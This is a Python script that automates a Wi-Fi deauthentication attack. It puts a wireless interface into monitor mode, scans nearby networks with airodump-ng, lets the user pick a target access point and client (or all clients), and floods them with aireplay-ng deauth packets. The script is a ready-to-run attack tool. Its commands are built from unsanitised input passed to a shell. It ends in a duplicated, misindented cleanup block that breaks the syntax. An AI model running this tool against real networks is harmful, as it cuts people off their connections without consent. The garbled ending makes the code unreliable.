import subprocess
import os
import sys
import time

def command_exists(command):
    try:
        if sys.platform.startswith('win'):
            subprocess.run(["where", command], check=True, capture_output=True, text=True, timeout=1)
        else:
            subprocess.run(["which", command], check=True, capture_output=True, text=True, timeout=1)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False
    except Exception:
        return False

def check_dependencies():
    print("\n🔎 Checking for required tools (airmon-ng, iwconfig, aireplay-ng, airodump-ng)...")
    required_tools = ["airmon-ng", "iwconfig", "aireplay-ng", "airodump-ng"]
    missing_tools = []
    for tool in required_tools:
        if not command_exists(tool):
            missing_tools.append(tool)
    if missing_tools:
        print("\n❌ Error: The following required tools are not installed or not in your PATH:")
        for tool in missing_tools:
            print(f"- {tool}")
        print("\nPlease install them (e.g., using 'sudo apt install aircrack-ng wireless-tools' on Debian/Ubuntu) and try again.")
        return False
    else:
        print("✅ All required tools found.")
        return True

if os.geteuid() != 0:
    print("❌ This script must be run as root. Use sudo.")
    sys.exit(1)

check_prompt = input("❓ Do you want to check if required tools (airmon-ng, iwconfig, aireplay-ng, airodump-ng) are installed? (yes/no): ").strip().lower()

if check_prompt != 'no':
    if not check_dependencies():
        print("Exiting due to missing dependencies.")
        sys.exit(1)
else:
    print("Skipping dependency check as requested.")

initial_interface = input("🛰️ Enter your wireless interface (e.g. wlan0): ").strip()
monitor_interface = ""

print(f"\n🔧 Attempting to put {initial_interface} into monitor mode...")

try:
    airmon_start_command = f"airmon-ng start {initial_interface}"
    print(f"🔥 Running command: {airmon_start_command}")
    airmon_result = subprocess.run(airmon_start_command, shell=True, check=True, capture_output=True, text=True)
    print("✅ airmon-ng start executed successfully.")
    print("\n--- airmon-ng start Output ---")
    print(airmon_result.stdout)
    print("-----------------------------")
    if airmon_result.stderr:
        print("\n--- airmon-ng start Errors ---")
        print(airmon_result.stderr)
        print("-----------------------------")
    output_lines = airmon_result.stdout.splitlines()
    found_monitor_interface = False
    for line in output_lines:
        if "monitor mode enabled on" in line:
            parts = line.split()
            if len(parts) > 4:
                monitor_interface = parts[-1].strip(')')
                print(f"\n✨ Detected monitor interface: {monitor_interface}")
                found_monitor_interface = True
                break
    if not found_monitor_interface:
        print("\n⚠️ Could not automatically detect the new monitor interface name.")
        monitor_interface = input(f"Please manually enter the new monitor interface name (e.g. {initial_interface}mon): ").strip()
        if not monitor_interface:
            print("❌ No monitor interface name provided. Exiting.")
            sys.exit(1)
        print(f"Using manually entered monitor interface: {monitor_interface}")
    time.sleep(2)
except subprocess.CalledProcessError as e:
    print(f"\n❌ Error running airmon-ng start. Make sure the interface exists and is not already in use: {e}")
    print(f"Stderr: {e.stderr}")
    sys.exit(1)
except FileNotFoundError:
    print("\n❌ Error: airmon-ng not found. Make sure aircrack-ng suite is installed and in your PATH.")
    sys.exit(1)
except Exception as e:
    print(f"\n❌ An unexpected error occurred during airmon-ng start: {e}")
    sys.exit(1)

scan_prefix = "airblast_scan"
scan_command = f"airodump-ng --output-format csv -w {scan_prefix} {monitor_interface}"
scan_duration = 15

print(f"\n📡 Scanning for networks on {monitor_interface} for {scan_duration} seconds...")
print(f"🔥 Running command: {scan_command}")

scan_process = None
try:
    scan_process = subprocess.Popen(scan_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(scan_duration)
    scan_process.terminate()
    time.sleep(1)
    if scan_process.poll() is None:
        scan_process.kill()
    stdout, stderr = scan_process.communicate()
    if stdout:
        print("\n--- airodump-ng stdout (during termination) ---")
        print(stdout.decode(errors='ignore'))
        print("---------------------------------------------")
    if stderr:
        print("\n--- airodump-ng stderr (during termination) ---")
        print(stderr.decode(errors='ignore'))
        print("---------------------------------------------")
except FileNotFoundError:
    print("\n❌ Error: airodump-ng not found. Make sure aircrack-ng suite is installed and in your PATH.")
    if scan_process and scan_process.poll() is None:
        scan_process.kill()
    sys.exit(1)
except Exception as e:
    print(f"\n❌ An unexpected error occurred during airodump-ng scan: {e}")
    if scan_process and scan_process.poll() is None:
        scan_process.kill()
    sys.exit(1)

print("\n✅ Scan finished.")

csv_file = f"{scan_prefix}-01.csv"
networks = []

print(f"📊 Parsing scan results from {csv_file}...")

try:
    if not os.path.exists(csv_file):
        print(f"\n❌ Error: Scan output file '{csv_file}' not found after scan.")
        print("This might happen if no networks were found or airodump-ng failed to write the file.")
        sys.exit(1)
    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    network_section = False
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if line.startswith("BSSID"):
            network_section = True
            continue
        if line.startswith("Station MAC"):
            network_section = False
            break
        if network_section:
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid_parts = parts[13:]
                essid = ','.join(essid_parts).strip().strip('"')
                if bssid and channel.isdigit():
                    networks.append({"bssid": bssid, "channel": channel, "essid": essid if essid else "<Hidden/Broadcast>"})
    if not networks:
        print("\n⚠️ No networks found during the scan.")
        if os.path.exists(csv_file):
            os.remove(csv_file)
        for ext in ['.csv', '.kismet.csv', '.kismet.netxml', '.cap']:
            extra_file = f"{scan_prefix}-01{ext}"
            if os.path.exists(extra_file):
                os.remove(extra_file)
        sys.exit(0)

    print("\n✨ Found Networks:")
    for i, network in enumerate(networks):
        print(f"{i + 1}: ESSID: {network['essid']} | BSSID: {network['bssid']} | Channel: {network['channel']}")

    selected_network_index = -1
    while selected_network_index < 0 or selected_network_index >= len(networks):
        try:
            selection = input(f"🔢 Enter the number of the network you want to target (1-{len(networks)}): ").strip()
            selected_network_index = int(selection) - 1
            if selected_network_index < 0 or selected_network_index >= len(networks):
                print("❌ Invalid number. Please enter a number from the list.")
        except ValueError:
            print("❌ Invalid input. Please enter a number.")

    selected_network = networks[selected_network_index]
    target_bssid = selected_network['bssid']
    target_channel = selected_network['channel']
    target_essid = selected_network['essid']

    print(f"\n✅ You selected: ESSID: {target_essid} | BSSID: {target_bssid} | Channel: {target_channel}")

    target_mac = input("🎯 Enter the target client MAC address (e.g. AA:BB:CC:DD:EE:FF) or 'broadcast' for all clients: ").strip()
    if not target_mac:
        print("❌ No target MAC provided. Exiting.")
        sys.exit(1)

    deauth_count = -1
    while deauth_count <= 0:
        try:
            count_input = input("💥 Enter the number of deauthentication packets to send (e.g. 100): ").strip()
            deauth_count = int(count_input)
            if deauth_count <= 0:
                print("❌ Please enter a positive number of packets.")
        except ValueError:
            print("❌ Invalid input. Please enter a number.")

    print(f"\n🔧 Setting monitor interface {monitor_interface} to channel {target_channel}...")
    try:
        iwconfig_command = f"iwconfig {monitor_interface} channel {target_channel}"
        print(f"🔥 Running command: {iwconfig_command}")
        iwconfig_result = subprocess.run(iwconfig_command, shell=True, check=True, capture_output=True, text=True)
        print("✅ iwconfig channel set successfully.")
        if iwconfig_result.stdout:
            print("\n--- iwconfig Output ---")
            print(iwconfig_result.stdout)
            print("-----------------------")
        if iwconfig_result.stderr:
            print("\n--- iwconfig Errors ---")
            print(iwconfig_result.stderr)
            print("-----------------------")
        time.sleep(1)
    except subprocess.CalledProcessError as e:
        print(f"\n❌ Error setting channel with iwconfig. Make sure the interface name is correct and the channel is valid: {e}")
        print(f"Stderr: {e.stderr}")
        sys.exit(1)
    except FileNotFoundError:
        print("\n❌ Error: iwconfig not found. Make sure wireless-tools is installed and in your PATH.")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ An unexpected error occurred during iwconfig: {e}")
        sys.exit(1)

    command = f"aireplay-ng --deauth {deauth_count} -a {target_bssid} -c {target_mac} {monitor_interface}"

    print(f"\n💥 Initiating deauthentication attack...")
    print(f"🔥 Running command: {command}")

    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        print("\n✅ aireplay-ng command finished.")
        print("\n--- aireplay-ng Output ---")
        print(result.stdout)
        print("----------------------")
        if result.stderr:
            print("\n--- aireplay-ng Errors ---")
            print(result.stderr)
            print("----------------------")
    except subprocess.CalledProcessError as e:
        print(f"\n❌ Error executing aireplay-ng command. Make sure the BSSID, target MAC, and interface are correct: {e}")
        print(f"Stderr: {e.stderr}")
    except FileNotFoundError:
        print("❌ Error: aireplay-ng not found. Make sure it's installed and in your PATH.")
    except Exception as e:
        print(f"An unexpected error occurred during aireplay-ng: {e}")

finally:
    print(f"\n🔧 Attempting to stop monitor mode on {monitor_interface}...")
    try:
        airmon_stop_command = f"airmon-ng stop {monitor_interface}"
        print(f"🔥 Running command: {airmon_stop_command}")
        subprocess.run(airmon_stop_command, shell=True, capture_output=True, text=True, timeout=10)
        print("✅ Monitor mode stopped successfully.")
    except subprocess.TimeoutExpired:
        print(f"\n⚠️ Timeout trying to stop monitor mode. Please manually run: sudo airmon-ng stop {monitor_interface}")
    except Exception as e:
        print(f"\n⚠️ Could not stop monitor mode automatically: {e}")
        print(f"Please manually run: sudo airmon-ng stop {monitor_interface}")

    print("\n🧹 Cleaning up scan files...")
    try:
        if os.path.exists(csv_file):
            os.remove(csv_file)
        for ext in ['.csv', '.kismet.csv', '.kismet.netxml', '.cap']:
            extra_file = f"{scan_prefix}-01{ext}"
            if os.path.exists(extra_file):
                os.remove(extra_file)
        print("✅ Scan files cleaned up.")
    except Exception as e:
        print(f"\n⚠️ Could not clean up scan files: {e}")
        
        finally:

    print("\n🧹 Cleaning up scan files...")
    try:
        if os.path.exists(csv_file):
            os.remove(csv_file)
      
        for ext in ['.csv', '.kismet.csv', '.kismet.netxml', '.cap']:
            extra_file = f"{scan_prefix}-01{ext}"
            if os.path.exists(extra_file):
                os.remove(extra_file)
        print("✅ Scan files cleaned up.")
    except Exception as e:
        print(f"\n⚠️ Could not clean up scan files: {e}")

